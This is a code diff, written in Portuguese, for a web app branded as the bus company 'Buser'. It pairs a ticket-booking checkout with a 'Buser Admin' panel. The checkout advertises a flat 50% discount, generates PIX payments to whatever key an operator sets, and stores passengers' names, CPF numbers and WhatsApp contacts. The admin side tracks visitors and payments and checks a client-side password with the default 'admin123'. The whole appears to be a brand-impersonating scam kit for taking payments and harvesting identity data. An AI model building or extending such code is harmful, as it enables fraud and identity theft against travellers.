-  let viagemSel = null, passageiros = [], precoUnit = 0, assentosSelecionados = [];
-  let checkoutState = { total: 0, payload: '', txid: '', empresa: '', poltrona: '', route: '', key: '', receiverName: '' };
-  let listenerStatusPedido = null;
-  const MAX_PASSAGEIROS = 6;
-
-  function selecionarViagem(index) {
-    viagemSel = viagensOriginais[index];
-    passageiros = []; assentosSelecionados = [];
-    precoUnit = (parseFloat(viagemSel.price) || 0) * 0.5;
-    passageiros.push({ nome: '', cpf: '', dataNascimento: '', email: '', whatsapp: '' });
-    redesenharPassageiros();
-    document.getElementById('modal-passageiros').style.display = 'flex';
-  }
-
-  function criarBoxPassageiro(p, i) {
-    const div = document.createElement('div');
-    div.className = 'passageiro-box';
-    div.innerHTML = `
-      <p style="font-weight:600;margin:0 0 8px;">Passageiro ${i + 1}</p>
-      ${i > 0 ? `<button class="btn-remover-passageiro" onclick="removerPassageiro(${i})" aria-label="Remover passageiro ${i + 1}">✕ Remover</button>` : ''}
-      <input type="text" placeholder="Nome completo" autocomplete="name" enterkeyhint="next"
-        value="${p.nome || ''}" oninput="atualizarPassageiro(${i},'nome',this.value)">
-      <input type="text" placeholder="CPF" inputmode="numeric" enterkeyhint="next" maxlength="14"
-        value="${p.cpf || ''}" oninput="this.value=mascaraCPF(this.value);atualizarPassageiro(${i},'cpf',this.value)">
-      <input type="text" placeholder="Data de nascimento" inputmode="numeric" enterkeyhint="next" maxlength="10"
-        value="${p.dataNascimento || ''}" oninput="this.value=mascaraData(this.value);atualizarPassageiro(${i},'dataNascimento',this.value)">
-      <input type="email" placeholder="E-mail" inputmode="email" autocomplete="email" enterkeyhint="next"
-        value="${p.email || ''}" oninput="atualizarPassageiro(${i},'email',this.value)">
-      <input type="tel" placeholder="WhatsApp" inputmode="tel" autocomplete="tel" enterkeyhint="done" maxlength="15"
-        value="${p.whatsapp || ''}" oninput="this.value=mascaraWhats(this.value);atualizarPassageiro(${i},'whatsapp',this.value)">
-    `;
-    return div;
-  }
-
-  function redesenharPassageiros() {
-    const container = document.getElementById('lista-passageiros');
-    container.innerHTML = '';
-    passageiros.forEach((p, i) => container.appendChild(criarBoxPassageiro(p, i)));
-    const btnAdd = document.querySelector('#modal-passageiros button[onclick="adicionarPassageiro()"]');
-    if (btnAdd) {
-      const cheio = passageiros.length >= MAX_PASSAGEIROS;
-      btnAdd.disabled = cheio;
-      btnAdd.style.opacity = cheio ? '0.5' : '1';
-      btnAdd.style.cursor = cheio ? 'not-allowed' : 'pointer';
-      btnAdd.textContent = cheio ? `Limite de ${MAX_PASSAGEIROS} passageiros atingido` : '+ Adicionar passageiro';
-    }
-    atualizarTotal();
-  }
-
-  function adicionarPassageiro() {
-    if (passageiros.length >= MAX_PASSAGEIROS) return;
-    passageiros.push({ nome: '', cpf: '', dataNascimento: '', email: '', whatsapp: '' });
-    redesenharPassageiros();
-    const boxes = document.querySelectorAll('#lista-passageiros .passageiro-box');
-    const ultimo = boxes[boxes.length - 1];
-    if (ultimo) ultimo.querySelector('input')?.focus();
-  }
-
-  function removerPassageiro(index) {
-    if (passageiros.length <= 1) return;
-    passageiros.splice(index, 1);
-    assentosSelecionados = [];
-    redesenharPassageiros();
-  }
-
-  function atualizarPassageiro(i, campo, valor) { passageiros[i][campo] = valor; }
-
-  function atualizarTotal() {
-    const totalFinal = precoUnit * passageiros.length;
-    document.getElementById('valor-total').innerHTML = `<span style="text-decoration:line-through;color:#999;font-size:14px;margin-right:8px;">R$ ${(totalFinal * 2).toFixed(2).replace('.', ',')}</span>R$ ${totalFinal.toFixed(2).replace('.', ',')}<span class="desconto-badge">-50%</span>`;
-  }
-
-  function fecharModalPassageiros() { document.getElementById('modal-passageiros').style.display = 'none'; }
-
-  function confirmarPassageiros() {
-    for (let i = 0; i < passageiros.length; i++) {
-      if (!passageiros[i].nome || !passageiros[i].cpf || !passageiros[i].whatsapp) { alert(`Preencha os dados do passageiro ${i + 1}.`); return; }
-    }
-    fecharModalPassageiros();
-    abrirModalPoltrona(viagemSel);
-  }
-
-  function abrirModalPoltrona(viagem) {
-    assentosSelecionados = [];
-    const mapa = document.getElementById('mapa-onibus');
-    mapa.innerHTML = '';
-    const total = viagem.total_seats || 46;
-    const ocupadas = new Set(viagem.occupied_seats || []);
-    const busMap = document.createElement('div');
-    busMap.className = 'bus-map';
-    busMap.innerHTML = '<div class="bus-windshield">🚌</div>';
-    const busGrid = document.createElement('div');
-    busGrid.className = 'bus-grid';
-    for (let i = 1; i <= total; i += 4) {
-      const row = document.createElement('div');
-      row.className = 'bus-row';
-      for (let j = 0; j < 2; j++) {
-        const num = i + j;
-        if (num <= total) {
-          const btn = document.createElement('button');
-          btn.textContent = num; btn.className = 'poltrona-btn';
-          if (ocupadas.has(num)) btn.disabled = true;
-          else btn.onclick = () => selecionarAssento(btn, num);
-          row.appendChild(btn);
-        } else { const p = document.createElement('div'); p.className = 'bus-placeholder'; row.appendChild(p); }
-      }
-      const aisle = document.createElement('div'); aisle.className = 'bus-aisle'; row.appendChild(aisle);
-      for (let j = 2; j < 4; j++) {
-        const num = i + j;
-        if (num <= total) {
-          const btn = document.createElement('button');
-          btn.textContent = num; btn.className = 'poltrona-btn';
-          if (ocupadas.has(num)) btn.disabled = true;
-          else btn.onclick = () => selecionarAssento(btn, num);
-          row.appendChild(btn);
-        } else { const p = document.createElement('div'); p.className = 'bus-placeholder'; row.appendChild(p); }
-      }
-      busGrid.appendChild(row);
-    }
-    busMap.appendChild(busGrid);
-    mapa.appendChild(busMap);
-    atualizarInfoPoltronas();
-    document.getElementById('modal-poltrona').style.display = 'flex';
-  }
-
-  function selecionarAssento(btn, num) {
-    const idx = assentosSelecionados.indexOf(num);
-    if (idx >= 0) { assentosSelecionados.splice(idx, 1); btn.classList.remove('selecionada'); }
-    else {
-      if (assentosSelecionados.length >= passageiros.length) { alert(`Máximo ${passageiros.length} poltrona(s).`); return; }
-      assentosSelecionados.push(num);
-      btn.classList.add('selecionada');
-    }
-    atualizarInfoPoltronas();
-  }
-
-  function atualizarInfoPoltronas() {
-    const fonte = document.getElementById('poltrona-fonte');
-    const completo = assentosSelecionados.length === passageiros.length;
-    fonte.innerHTML = `<div class="poltrona-legenda"><span><span class="sw" style="background:#fff;"></span> Livre</span><span><span class="sw" style="background:#454545;"></span> Ocupada</span><span><span class="sw" style="background:var(--brand);"></span> Selecionada</span></div><div style="text-align:center;font-size:14px;font-weight:600;color:${completo ? '#40b552' : 'var(--brand)'};">${completo ? '✅' : '👉'} ${assentosSelecionados.length} de ${passageiros.length} selecionada(s)</div>`;
-  }
-
-  function fecharModalPoltrona() { document.getElementById('modal-poltrona').style.display = 'none'; }
-
-  function confirmarPoltrona() {
-    if (assentosSelecionados.length !== passageiros.length) { alert(`Selecione ${passageiros.length} poltrona(s).`); return; }
-    fecharModalPoltrona();
-    abrirCheckout();
-  }
-
-  function abrirCheckout() {
-    const precoOriginal = parseFloat(viagemSel.price) || 0;
-    const totalFinal = precoOriginal * 0.5 * passageiros.length;
-    checkoutState.total = totalFinal;
-    checkoutState.route = `${document.getElementById('input-origem').value} → ${document.getElementById('input-destino').value}`;
-    checkoutState.empresa = viagemSel.company.name;
-    checkoutState.poltrona = assentosSelecionados.join(', ');
-
-    const termSaida = formatarTerminalExibicao(viagemSel.departure.city, viagemSel.departure.terminal.name);
-    const termChegada = formatarTerminalExibicao(viagemSel.arrival.city, viagemSel.arrival.terminal.name);
-
-    document.getElementById('checkout-info').innerHTML = `
-      <div style="display:flex; justify-content:space-between; margin-bottom:12px;"><span style="color:#666;">Empresa:</span> <strong>${viagemSel.company.name}</strong></div>
-      <div style="display:flex; justify-content:space-between; margin-bottom:12px;"><span style="color:#666;">Rota:</span> <strong>${checkoutState.route}</strong></div>
-      <div style="display:flex; justify-content:space-between; margin-bottom:12px;"><span style="color:#666;">Embarque:</span> <strong style="text-align:right; max-width:60%;">${termSaida}</strong></div>
-      <div style="display:flex; justify-content:space-between; margin-bottom:12px;"><span style="color:#666;">Desembarque:</span> <strong style="text-align:right; max-width:60%;">${termChegada}</strong></div>
-      <div style="display:flex; justify-content:space-between; margin-bottom:12px;"><span style="color:#666;">Poltrona(s):</span> <strong>${checkoutState.poltrona}</strong></div>
-      <div style="display:flex; justify-content:space-between; margin-bottom:12px;"><span style="color:#666;">Passageiros:</span> <strong>${passageiros.length}</strong></div>
-      <div style="background:#f0f9f0; padding:16px; border-radius:8px; margin-top:16px; text-align:center;"><div style="font-size:12px; color:#666;">Total a pagar</div><div style="color:var(--brand); font-weight:800; font-size:28px;">R$ ${totalFinal.toFixed(2).replace('.', ',')}</div></div>
-    `;
-    document.getElementById('area-pix').innerHTML = `<button onclick="gerarPix()" style="width:100%;padding:16px;background:var(--brand);color:#fff;border:none;border-radius:8px;font-weight:700;font-size:16px;cursor:pointer;">Gerar PIX</button>`;
-    document.getElementById('modal-checkout').style.display = 'flex';
-  }
-
-  function fecharCheckout() { document.getElementById('modal-checkout').style.display = 'none'; }
-
-  async function gerarPix() {
-    try {
-      if (!db) throw new Error('Firebase não inicializado');
-      const snap = await db.ref('buser_pix_cfg').once('value');
-      const cfg = snap.val() || {};
-      if (!cfg.key) { alert('⚠️ Chave PIX não configurada. Peça ao administrador para configurar em /buser_pix_cfg { key, name, city }.'); return; }
-
-      const key = String(cfg.key).replace(/\s+/g, '').trim();
-      const nome = (cfg.name || 'BUSER').toUpperCase().substring(0, 25);
-      const cidade = (cfg.city || 'SAO PAULO').toUpperCase().substring(0, 15);
-      const total = checkoutState.total || 0;
-      const valor = total.toFixed(2);
-
-      const campo01 = `01${String(key.length).padStart(2, '0')}${key}`;
-      const merchantAccInfo = `0014br.gov.bcb.pix${campo01}`;
-      const campo26 = `26${String(merchantAccInfo.length).padStart(2, '0')}${merchantAccInfo}`;
-      const campo00 = '000201', campo52 = '52040000', campo53 = '5303986';
-      const campo54 = `54${String(valor.length).padStart(2, '0')}${valor}`;
-      const campo58 = '5802BR';
-      const campo59 = `59${String(nome.length).padStart(2, '0')}${nome}`;
-      const campo60 = `60${String(cidade.length).padStart(2, '0')}${cidade}`;
-      const campo62 = '62070503***';
-      const payloadSemCRC = `${campo00}${campo26}${campo52}${campo53}${campo54}${campo58}${campo59}${campo60}${campo62}6304`;
-
-      function calcularCRC16(str) {
-        let crc = 0xFFFF;
-        for (let i = 0; i < str.length; i++) {
-          crc ^= str.charCodeAt(i) << 8;
-          for (let j = 0; j < 8; j++) { crc = (crc & 0x8000) ? ((crc << 1) ^ 0x1021) : (crc << 1); crc &= 0xFFFF; }
-        }
-        return crc.toString(16).toUpperCase().padStart(4, '0');
-      }
-
-      const payload = payloadSemCRC + calcularCRC16(payloadSemCRC);
-      const txid = 'BUSER' + Date.now().toString().slice(-8);
-      checkoutState.payload = payload;
-      checkoutState.txid = txid;
-      checkoutState.key = key;
-      checkoutState.receiverName = nome;
-
-      try {
-        const clienteId = getClienteId();
-        await db.ref(`buser_pedidos/${clienteId}/pix/${txid}`).set({
-          txid, key, receiverName: nome, amount: total, originalAmount: total * 2,
-          route: checkoutState.route, empresa: checkoutState.empresa, poltrona: checkoutState.poltrona,
-          status: 'pending', geradoEm: Date.now(), payload,
-          passengers: passageiros.map((p, i) => ({ nome: p.nome, cpf: p.cpf, whatsapp: p.whatsapp, poltrona: assentosSelecionados[i] }))
-        });
-      } catch (e) { console.warn('Não consegui registrar no Firebase:', e); }
-
-      const area = document.getElementById('area-pix');
-      area.innerHTML = `
-        <div class="pix-box">
-          <div class="pix-timer">Seu Pix expira em 29:45</div>
-          <h3 style="font-size:16px; margin:0 0 16px;">Veja como pagar com Pix</h3>
-          <p style="font-size:13px; color:#666; text-align:left; margin-bottom:16px;">1. Abra o APP/site do seu banco;<br>2. Selecione a opção pagar com o Pix;<br>3. Aponte sua câmera para o QR Code ou copie o código.</p>
-          <p style="font-size:12px; color:#999; margin:0;">Valor do Pix: R$ ${total.toFixed(2).replace('.', ',')}</p>
-          <div id="qrcode"></div>
-          <button class="pix-btn-copy" onclick="copiarPix()">📄 Copiar código do Pix</button>
-          <button onclick="mostrarPassagem()" style="width:100%; padding:14px; background:transparent; color:var(--brand); font-weight:700; font-size:15px; border:2px solid var(--brand); border-radius:8px; cursor:pointer; margin-top:8px;">Ver minha passagem →</button>
-        </div>
-      `;
-      new QRCode(document.getElementById('qrcode'), { text: payload, width: 200, height: 200, colorDark: '#000000', colorLight: '#ffffff', correctLevel: QRCode.CorrectLevel.H });
-    } catch (erro) {
-      console.error('Erro ao gerar PIX:', erro);
-      alert('❌ Não foi possível gerar o PIX.\n\n' + (erro.message || ''));
-    }
-  }
-
-  function copiarPix() {
-    navigator.clipboard.writeText(checkoutState.payload).then(async () => {
-      alert('✅ Código PIX copiado!');
-      try {
-        if (db && checkoutState.txid) {
-          const clienteId = getClienteId();
-          await db.ref(`buser_pedidos/${clienteId}/pix/${checkoutState.txid}`).update({ copiado: true, copiadoEm: Date.now() });
-        }
-      } catch (e) { console.warn(e); }
-    });
-  }
-
-  // ============================================================
-  // VOUCHER PREMIUM (LIBERAÇÃO EM TEMPO REAL)
-  // ============================================================
-  function mostrarPassagem() {
-    document.getElementById('modal-checkout').style.display = 'none';
-    document.getElementById('modal-passagem').style.display = 'flex';
-    
-    // Para o listener antigo, se existir
-    if (listenerStatusPedido) { listenerStatusPedido.off(); }
-
-    // Conecta no Firebase para ler o status em tempo real
-    if (db && checkoutState.txid) {
-      const clienteId = getClienteId();
-      listenerStatusPedido = db.ref(`buser_pedidos/${clienteId}/pix/${checkoutState.txid}`);
+<div id="admin-panel">
+  <header class="admin-header">
+    <button class="menu-toggle-btn" onclick="toggleSidebar()">☰</button>
+    <div class="brand-logo"><div class="dot">🚌</div> Buser Admin</div>
+    <div class="spacer"></div>
+    <button class="icon-btn" onclick="toggleDarkMode()" title="Alternar Tema">🌙</button>
+    <button class="logout-btn" onclick="fazerLogout()">Sair</button>
+  </header>
+
+  <div class="admin-layout">
+    <aside class="admin-sidebar" id="sidebar">
+      <button class="nav-item active" data-section="dashboard" onclick="irParaSecao('dashboard')"><i>📊</i> Dashboard</button>
+      <button class="nav-item" data-section="pedidos" onclick="irParaSecao('pedidos')"><i>🎫</i> Pedidos <span class="nav-badge" id="nav-badge-pedidos">0</span></button>
+      <button class="nav-item" data-section="clientes" onclick="irParaSecao('clientes')"><i>👥</i> Base de Clientes</button>
+      <button class="nav-item" data-section="visitas" onclick="irParaSecao('visitas')"><i>📈</i> Visitas <span class="nav-badge" id="nav-badge-visitas">0</span></button>
+      <button class="nav-item" data-section="pix-config" onclick="irParaSecao('pix-config')"><i>💳</i> Config. PIX</button>
+      <button class="nav-item" data-section="config" onclick="irParaSecao('config')"><i>⚙️</i> Configurações</button>
+    </aside>
+
+    <main class="admin-main">
       
-      listenerStatusPedido.on('value', (snap) => {
-        const dados = snap.val();
-        const statusAtual = dados ? dados.status : 'pending';
-        renderizarVoucher(statusAtual);
-      });
-    } else {
-      // Fallback local
-      renderizarVoucher('pending');
-    }
-  }
-
-  function renderizarVoucher(status) {
-    const content = document.getElementById('passagem-content');
-    
-    const dataFormatada = (document.getElementById('input-ida').value || '').split('-').reverse().join('/');
-    const codReserva = checkoutState.txid.substring(0, 6).toUpperCase();
-    
-    const termSaida = formatarTerminalExibicao(viagemSel.departure.city, viagemSel.departure.terminal.name);
-    const termChegada = formatarTerminalExibicao(viagemSel.arrival.city, viagemSel.arrival.terminal.name);
-    const enderecoBusca = encodeURIComponent(viagemSel.departure.terminal.name + ' ' + (viagemSel.departure.terminal.address || '') + ' ' + viagemSel.departure.city);
-
-    // Configura o visual baseado no status
-    let statusColor = '#b87d00';
-    let statusIcon = '⏳';
-    let statusText = 'PENDENTE (Aguardando PIX)';
-    let botaoImprimir = `<button style="flex:1; padding:14px; background:#eee; border:2px solid #ddd; color:#999; font-weight:700; border-radius:12px; cursor:not-allowed;" disabled>🖨️ Aguardando Pagamento</button>`;
-
-    if (status === 'paid') {
-      statusColor = '#2e9a3e';
-      statusIcon = '✅';
-      statusText = 'PAGO (Passagem Liberada)';
-      botaoImprimir = `<button onclick="window.print()" style="flex:1; padding:14px; background:var(--brand); border:2px solid var(--brand); color:#fff; font-weight:700; border-radius:12px; cursor:pointer;">🖨️ Imprimir Passagem</button>`;
-    } else if (status === 'cancelled') {
-      statusColor = '#d81b60';
-      statusIcon = '❌';
-      statusText = 'CANCELADO';
-      botaoImprimir = `<button style="flex:1; padding:14px; background:#eee; border:2px solid #ddd; color:#999; font-weight:700; border-radius:12px; cursor:not-allowed;" disabled>🖨️ Pedido Cancelado</button>`;
-    }
-
-    const passageirosHtml = passageiros.map((p, i) => `
-      <div class="voucher-passenger-item">
-        <div>
-          <strong style="display:block; color:var(--grey-dark);">${p.nome}</strong>
-          <span style="font-size:12px; color:var(--grey-med);">CPF: ${p.cpf}</span>
-        </div>
-        <div class="seat">POLTRONA ${assentosSelecionados[i]}</div>
-      </div>
-    `).join('');
-
-    content.innerHTML = `
-      <div class="voucher-card">
-        <div class="voucher-header">
-          <h2>${viagemSel.company.name}</h2>
-          <p>${viagemSel.bus_type} • Reserva: ${codReserva}</p>
+      <!-- DASHBOARD -->
+      <section class="section active" id="section-dashboard">
+        <div class="section-header">
+          <div><h1>Dashboard</h1><p>Visão geral do seu negócio em tempo real</p></div>
         </div>
         
-        <div class="voucher-divider"><div class="voucher-dashed-line"></div></div>
-
-        <div class="voucher-body">
-          <div class="voucher-route">
-            <div class="point">
-              <h3>${viagemSel.departure.city}</h3>
-              <p>${viagemSel.departure.time}</p>
-            </div>
-            <div class="icon">🚌</div>
-            <div class="point dest">
-              <h3>${viagemSel.arrival.city}</h3>
-              <p>${viagemSel.arrival.time}</p>
-            </div>
+        <div class="stats-grid">
+          <div class="stat-card pink">
+            <div class="sc-icon">🎫</div>
+            <div class="sc-label">Total de Pedidos</div>
+            <div class="sc-value" id="stat-total">0</div>
           </div>
-
-          <div class="voucher-info-grid">
-            <div><span>Data da Viagem</span><strong>${dataFormatada}</strong></div>
-            <div><span>Valor Total</span><strong>R$ ${checkoutState.total.toFixed(2).replace('.', ',')}</strong></div>
-            <div style="grid-column: 1/-1;">
-              <span>Status do Pagamento</span>
-              <strong style="color:${statusColor}; font-size: 16px;">${statusIcon} ${statusText}</strong>
-            </div>
+          <div class="stat-card green">
+            <div class="sc-icon">💰</div>
+            <div class="sc-label">Faturamento Pago</div>
+            <div class="sc-value" id="stat-faturamento">R$ 0,00</div>
           </div>
-
-          <div class="voucher-passengers">
-            <h4>Passageiros e Poltronas</h4>
-            ${passageirosHtml}
+          <div class="stat-card yellow">
+            <div class="sc-icon">⏳</div>
+            <div class="sc-label">Pendentes</div>
+            <div class="sc-value" id="stat-pendentes">0</div>
           </div>
-
-          <div style="margin-top: 24px;">
-            <a href="https://www.google.com/maps/search/?api=1&query=${enderecoBusca}" target="_blank" class="btn-maps">
-              📍 Ver Local de Embarque no Google Maps
-            </a>
+          <div class="stat-card blue">
+            <div class="sc-icon">👥</div>
+            <div class="sc-label">Online Agora</div>
+            <div class="sc-value" id="stat-online">0</div>
           </div>
         </div>
 
-        <div class="voucher-qr-area">
-          <div id="qrcode-voucher" style="display:inline-block;"></div>
-          <p>Apresente este QR Code no embarque</p>
+        <div class="sub-stats">
+          <div class="sub-stat-card">
+            <span>💵 Ticket Médio por Venda</span>
+            <strong id="stat-ticket-medio">R$ 0,00</strong>
+          </div>
+          <div class="sub-stat-card">
+            <span>🧳 Total de Passageiros</span>
+            <strong id="stat-passageiros">0</strong>
+          </div>
         </div>
-      </div>
 
-      <div style="display:flex; gap:12px; margin-top:20px;">
-        ${botaoImprimir}
-        <a href="https://wa.me/5511918764664?text=${encodeURIComponent('Olá! Acabei de gerar a reserva ' + codReserva + '.')}" target="_blank" style="flex:1; padding:14px; background:#25D366; color:#fff; font-weight:700; border-radius:12px; text-decoration:none; text-align:center; border:2px solid #25D366;">
-          💬 Falar no Whats
-        </a>
-      </div>
-    `;
+        <div class="charts-grid">
+          <div class="card">
+            <h2>📈 Faturamento (Últimos 7 dias)</h2>
+            <div class="chart-container">
+              <canvas id="graficoVendas"></canvas>
+            </div>
+          </div>
+          <div class="card">
+            <h2>🍕 Status dos Pedidos</h2>
+            <div class="pie-container">
+              <canvas id="graficoPizza"></canvas>
+            </div>
+          </div>
+        </div>
 
-    // Recria o QR Code a cada atualização de tela
-    new QRCode(document.getElementById("qrcode-voucher"), {
-      text: "RESERVA:" + codReserva + "|STATUS:" + status.toUpperCase(),
-      width: 120,
-      height: 120,
-      colorDark : "#000000",
-      colorLight : "#ffffff",
-      correctLevel : QRCode.CorrectLevel.H
+        <div class="card">
+          <h2>🏆 Top 5 Rotas Mais Vendidas</h2>
+          <div class="table-responsive">
+            <table>
+              <thead><tr><th>Rota</th><th>Qtd. Vendas</th></tr></thead>
+              <tbody id="lista-top-rotas"></tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+
+      <!-- PEDIDOS -->
+      <section class="section" id="section-pedidos">
+        <div class="section-header">
+          <div><h1>Pedidos</h1><p>Gerencie as vendas e feche o caixa</p></div>
+        </div>
+        <div class="filters-row">
+          <input type="text" id="filtro-busca" placeholder="🔍 Buscar TXID, rota, empresa, CPF..." oninput="renderizarPedidos()">
+          <select id="filtro-status" onchange="renderizarPedidos()">
+            <option value="">Todos os status</option>
+            <option value="pending">⏳ Pendente</option>
+            <option value="paid">✅ Pago</option>
+            <option value="cancelled">❌ Cancelado</option>
+          </select>
+          <div style="display:flex;align-items:center;gap:8px">
+            <span style="font-size:12px;color:var(--text-muted);font-weight:600">De:</span>
+            <input type="date" id="filtro-data-inicio" onchange="renderizarPedidos()">
+          </div>
+          <div style="display:flex;align-items:center;gap:8px">
+            <span style="font-size:12px;color:var(--text-muted);font-weight:600">Até:</span>
+            <input type="date" id="filtro-data-fim" onchange="renderizarPedidos()">
+          </div>
+          <button class="btn-export" onclick="exportarCSV()">⬇️ Exportar</button>
+        </div>
+        <div class="card">
+          <div class="table-responsive">
+            <table>
+              <thead>
+                <tr>
+                  <th>Status</th>
+                  <th>TXID / Data</th>
+                  <th>Rota / Empresa</th>
+                  <th>Passageiros</th>
+                  <th>Valor</th>
+                  <th>Ações</th>
+                </tr>
+              </thead>
+              <tbody id="lista-pedidos"></tbody>
+            </table>
+            <div id="empty-pedidos" style="display:none;text-align:center;padding:40px;color:var(--text-muted)">Nenhum pedido encontrado.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- CLIENTES (CRM) -->
+      <section class="section" id="section-clientes">
+        <div class="section-header">
+          <div><h1>Base de Clientes</h1><p>Todos os passageiros que já compraram com você</p></div>
+        </div>
+        <div class="filters-row">
+          <input type="text" id="filtro-busca-cliente" placeholder="🔍 Buscar por nome ou CPF..." oninput="renderizarClientes()">
+        </div>
+        <div class="card">
+          <div class="table-responsive">
+            <table>
+              <thead>
+                <tr>
+                  <th>Nome</th>
+                  <th>CPF</th>
+                  <th>WhatsApp / E-mail</th>
+                  <th>Total em Compras</th>
+                  <th>Última Compra</th>
+                  <th>Ação</th>
+                </tr>
+              </thead>
+              <tbody id="lista-clientes"></tbody>
+            </table>
+            <div id="empty-clientes" style="display:none;text-align:center;padding:40px;color:var(--text-muted)">Nenhum cliente registrado ainda.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- VISITAS -->
+      <section class="section" id="section-visitas">
+        <div class="section-header">
+          <div><h1>Tráfego e Visitas</h1><p>Quem está no site agora</p></div>
+          <button class="btn-cancel" onclick="limparHistoricoVisitas()" style="padding: 10px 16px; display: flex; align-items: center; gap: 8px;">
+            🗑️ Limpar Histórico de Visitas
+          </button>
+        </div>
+        <div class="stats-grid" style="grid-template-columns:repeat(3,1fr)">
+          <div class="stat-card blue">
+            <div class="sc-icon">🟢</div>
+            <div class="sc-label">Online Agora</div>
+            <div class="sc-value" id="stat-visitas-online">0</div>
+          </div>
+          <div class="stat-card pink">
+            <div class="sc-icon">📚</div>
+            <div class="sc-label">Total de Visitantes</div>
+            <div class="sc-value" id="stat-visitas-total">0</div>
+          </div>
+          <div class="stat-card green">
+            <div class="sc-icon">📅</div>
+            <div class="sc-label">Novos Hoje</div>
+            <div class="sc-value" id="stat-visitas-hoje">0</div>
+          </div>
+        </div>
+        <div class="card">
+          <h2>👥 Histórico de Navegação</h2>
+          <div class="table-responsive">
+            <table>
+              <thead>
+                <tr>
+                  <th>Status</th>
+                  <th>ID do Visitante</th>
+                  <th>Primeira Visita</th>
+                  <th>Última Atividade</th>
+                </tr>
+              </thead>
+              <tbody id="lista-visitas"></tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+
+      <!-- PIX CONFIG -->
+      <section class="section" id="section-pix-config">
+        <div class="section-header">
+          <div><h1>Configuração PIX</h1><p>Chave que será usada para gerar os QR Codes</p></div>
+        </div>
+        <div class="card">
+          <div class="pix-form">
+            <div class="form-group">
+              <label>Chave PIX</label>
+              <input type="text" id="pix-key" placeholder="CPF, CNPJ, email, telefone...">
+            </div>
+            <div class="form-group">
+              <label>Cidade do Recebedor</label>
+              <input type="text" id="pix-city" placeholder="Ex: SAO PAULO" maxlength="15">
+            </div>
+            <div class="form-group full">
+              <label>Nome do Recebedor</label>
+              <input type="text" id="pix-name" placeholder="Ex: BUSER TECNOLOGIA" maxlength="25">
+            </div>
+          </div>
+          <div style="margin-top:20px;display:flex;gap:12px;flex-wrap:wrap">
+            <button class="btn-primary" onclick="salvarPixConfig()">💾 Salvar Configuração</button>
+            <button class="btn-primary" style="background:var(--hover-bg);color:var(--text-main);box-shadow:none" onclick="testarPix()">🧪 Testar QR Code</button>
+          </div>
+          <div class="pix-preview" id="pix-preview">
+            <div class="qr-box" id="pix-qr"></div>
+            <div style="flex:1;min-width:200px">
+              <div style="font-size:12px;color:var(--text-muted);margin-bottom:6px">Preview do QR Code</div>
+              <div style="font-family:monospace;font-size:11px;word-break:break-all;color:var(--text-main);background:var(--bg-body);padding:10px;border-radius:6px;border:1px solid var(--border-color)" id="pix-payload-preview"></div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- CONFIGURAÇÕES -->
+      <section class="section" id="section-config">
+        <div class="section-header">
+          <div><h1>Configurações</h1><p>Gerencie sua conta admin e dados do sistema</p></div>
+        </div>
+        
+        <div class="card" style="max-width:500px">
+          <h2>🔐 Alterar Senha do Admin</h2>
+          <div class="pix-form" style="grid-template-columns:1fr">
+            <div class="form-group">
+              <label>Nova Senha</label>
+              <input type="password" id="nova-senha" placeholder="Mínimo 6 caracteres">
+            </div>
+            <div class="form-group">
+              <label>Confirmar Nova Senha</label>
+              <input type="password" id="confirma-senha" placeholder="Repita a senha">
+            </div>
+          </div>
+          <button class="btn-primary" style="margin-top:20px" onclick="alterarSenha()">Salvar Nova Senha</button>
+        </div>
+
+        <!-- ZONA DE PERIGO -->
+        <div class="card" style="max-width:500px; border-color: #d81b60; background: #fff0f3;">
+          <h2 style="color: #d81b60;">⚠️ Zona de Perigo</h2>
+          <p style="font-size: 13px; color: #666; margin-bottom: 16px;">
+            Ao clicar no botão abaixo, você vai <b>apagar permanentemente</b> todos os pedidos (gerados, pagos e cancelados) e todas as visitas. O caixa e os gráficos serão zerados. <br><br>Essa ação não pode ser desfeita!
+          </p>
+          <button class="btn-primary" style="background: linear-gradient(135deg, #d81b60 0%, #8b0045 100%); box-shadow: 0 8px 24px -4px rgba(216,27,96,.4); width: 100%;" onclick="limparTUDO()">
+            🗑️ Limpar TODOS os Dados (Pedidos + Visitas)
+          </button>
+        </div>
+
+      </section>
+
+    </main>
+  </div>
+</div>
+
+<div class="modal-overlay" id="modal-pedido" onclick="if(event.target===this)fecharModalPedido()">
+  <div class="modal-content">
+    <div class="modal-head">
+      <h2>Detalhes do Pedido</h2>
+      <button onclick="fecharModalPedido()">✕</button>
+    </div>
+    <div class="modal-body" id="modal-pedido-body"></div>
+  </div>
+</div>
+
+<div class="toast-container" id="toast-container"></div>
+
+<script>
+// FIREBASE
+const firebaseConfig = {
+  apiKey: "AIzaSyCmoxq5NMQUj1hqyWhjaJz4Uw4grhsFFhA",
+  authDomain: "projeto-link-ddbf0.firebaseapp.com",
+  databaseURL: "https://projeto-link-ddbf0-default-rtdb.firebaseio.com",
+  projectId: "projeto-link-ddbf0",
+  storageBucket: "projeto-link-ddbf0.firebasestorage.app",
+  messagingSenderId: "560317126646",
+  appId: "1:560317126646:web:be9cad9c9ed350940399d7"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+let pedidosCache = [];
+let visitasCache = [];
+let primeiraCarga = true;
+const STORAGE_KEY = 'buser_admin_logged';
+
+// TEMA ESCURO
+function toggleDarkMode() {
+  document.body.classList.toggle('dark-mode');
+  const isDark = document.body.classList.contains('dark-mode');
+  localStorage.setItem('buser_admin_theme', isDark ? 'dark' : 'light');
+  document.querySelector('.icon-btn').textContent = isDark ? '☀️' : '🌙';
+}
+if (localStorage.getItem('buser_admin_theme') === 'dark') {
+  document.body.classList.add('dark-mode');
+  document.querySelector('.icon-btn').textContent = '☀️';
+}
+
+// LOGIN
+async function carregarSenha() {
+  try { const snap = await db.ref('buser_admin_cfg/password').once('value'); return snap.val() || 'admin123'; } catch(e) { return 'admin123'; }
+}
+async function fazerLogin() {
+  const senha = document.getElementById('senha-input').value;
+  const errEl = document.getElementById('login-error');
+  errEl.textContent = '';
+  if (!senha) { errEl.textContent = 'Digite a senha'; return; }
+  const senhaCorreta = await carregarSenha();
+  if (senha === senhaCorreta) { 
+    sessionStorage.setItem(STORAGE_KEY, '1'); 
+    iniciarPainel(); 
+  } else { 
+    errEl.textContent = 'Senha incorreta'; 
+    document.getElementById('senha-input').value = ''; 
+  }
+}
